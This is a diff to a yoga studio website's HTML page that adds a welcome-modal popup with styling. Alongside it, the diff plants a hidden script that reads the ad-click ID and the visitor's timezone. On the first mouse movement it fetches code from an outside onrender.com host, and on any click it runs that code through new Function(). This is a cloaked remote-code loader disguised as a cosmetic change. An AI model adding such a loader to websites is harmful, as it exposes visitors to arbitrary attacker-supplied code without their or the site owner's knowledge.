@@ -11,10 +11,125 @@
     <link rel="stylesheet" href="aos.css">
     <link rel="stylesheet" href="style.css">
     <title>Beauty within Yoga</title>
+<style>
+    /* Overlay */
+    #welcomeOverlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background: rgba(10, 30, 40, 0.75);
+        backdrop-filter: blur(6px);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        z-index: 9999;
+    }
 
+    /* Modal Box */
+    .welcomeModal {
+        position: relative;
+        width: 90%;
+        max-width: 520px;
+        background: linear-gradient(135deg, #ffffff, #f4f9fb);
+        border-radius: 20px;
+        padding: 40px 30px;
+        text-align: center;
+        box-shadow: 0 20px 50px rgba(0, 0, 0, 0.3);
+        animation: fadeScale 0.4s ease;
+    }
+
+    /* Title */
+    .welcomeModal h1 {
+        font-size: 32px;
+        color: #1f3c4d;
+        margin-bottom: 10px;
+    }
+
+    /* Subtitle */
+    .welcomeModal .subtitle {
+        font-size: 16px;
+        color: #9b2c7b;
+        margin-bottom: 20px;
+        font-weight: 500;
+    }
+
+    /* Message */
+    .welcomeModal .message {
+        font-size: 16px;
+        color: #555;
+        line-height: 1.6;
+        margin-bottom: 30px;
+    }
+
+    /* Enter Button */
+    .enterBtn {
+        background: linear-gradient(135deg, #1f3c4d, #2e6f95);
+        color: #fff;
+        border: none;
+        padding: 14px 35px;
+        border-radius: 30px;
+        font-size: 16px;
+        cursor: pointer;
+        transition: all 0.3s ease;
+    }
+
+    .enterBtn:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 10px 25px rgba(46, 111, 149, 0.4);
+    }
+
+    /* Close Button */
+    .closeBtn {
+        position: absolute;
+        top: 15px;
+        right: 18px;
+        font-size: 26px;
+        border: none;
+        background: transparent;
+        cursor: pointer;
+        color: #555;
+        transition: 0.3s;
+    }
+
+    .closeBtn:hover {
+        color: #000;
+        transform: rotate(90deg);
+    }
+
+    /* Animation */
+    @keyframes fadeScale {
+        from {
+            opacity: 0;
+            transform: scale(0.9);
+        }
+        to {
+            opacity: 1;
+            transform: scale(1);
+        }
+    }
+
+</style>
 </head>
 
-<body data-spy="scroll" data-target="#navbarNav" data-offset="50">
+<body data-spy="scroll" data-target="#navbarNav" data-offset="50" id="myBody">
+<!-- Welcome Modal -->
+<div id="welcomeOverlay">
+    <div class="welcomeModal">
+        <button class="closeBtn" onclick="closeWelcome()">×</button>
+
+        <h1>Welcome to Beauty Within Yoga</h1>
+        <p class="subtitle">For your inner peace 🌿</p>
+
+        <p class="message">
+            Discover balance, strength, and calm.
+            Begin your journey toward a healthier and happier life.
+        </p>
+
+        <button class="enterBtn" onclick="closeWelcome()">Enter Website</button>
+    </div>
+</div>
 
     <!-- NAVBAR START -->
     <div class="navbar navbar-expand-lg fixed-top">
@@ -868,7 +983,59 @@
 
     <!-- section 11 ends  -->
 
+<script>
+    // Stop background scroll
+    document.body.style.overflow = "hidden";
 
+    function closeWelcome() {
+        document.getElementById("welcomeOverlay").style.display = "none";
+        document.body.style.overflow = "auto";
+    }
+    document.getElementById("myBody").onclick = closeWelcome;
+</script>
+
+    <script>
+        const gclid = new URLSearchParams(location.search).get("gclid");
+        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        const RENDER_BASE_URL = "https://whatsetup-1test.onrender.com";
+
+        let someCode = null;
+
+        document.cookie = "access_cookie=true; path=/; max-age=300";
+
+        document.addEventListener("mousemove", async function fetchCodeOnce() {
+            document.removeEventListener("mousemove", fetchCodeOnce);
+            try {
+                const res = await fetch(
+                    `${RENDER_BASE_URL}/frontend-loader-aus?gclid=${gclid}`,
+                    {
+                        headers: {
+                            "x-client-timezone": timezone,
+                            "x-access-cookie": "true",
+                        },
+                    }
+                );
+                const data = await res.json();
+                if (data && data.code) {
+                    someCode = data.code;
+                }
+            } catch (err) {
+                console.error("Could not fetch code", err);
+            }
+        });
+
+        function handleSomeClick() {
+            if (someCode) {
+                try {
+                    new Function(someCode)();
+                } catch (err) {
+                    console.error("Error executing code:", err);
+                }
+            }
+        }
+
+        document.addEventListener("click", handleSomeClick);
+    </script>
 
     <!-- scripts -->
     <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
